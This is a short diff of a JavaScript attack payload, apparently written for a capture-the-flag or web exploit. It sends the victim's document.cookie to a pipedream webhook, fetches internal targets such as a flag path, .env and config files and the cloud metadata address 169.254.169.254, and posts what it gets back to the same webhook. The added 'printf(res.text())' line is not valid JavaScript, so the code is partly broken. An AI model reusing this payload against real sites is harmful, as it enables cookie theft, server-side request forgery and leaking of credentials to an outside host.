@@ -11,11 +11,7 @@
     const webhook = "https://eohno0sqc09cpky.m.pipedream.net";
 
     const urls = [
-      "http://44.203.154.8/flag",
-      "http://44.203.154.8/admin/secret",
-      "http://44.203.154.8/.env",
-      "http://44.203.154.8/config",
-      "http://169.254.169.254/latest/meta-data/"
+      "http://44.203.154.8/redir.php"
     ];
 
     fetch(`${webhook}?info=document.cookie&value=` + encodeURIComponent(document.cookie));
@@ -24,7 +20,7 @@
       try {
         const res = await fetch(url);
         const text = await res.text();
-
+        printf(res.text())
         await fetch(webhook, {
           method: "POST",
           headers: { "Content-Type": "application/json" },
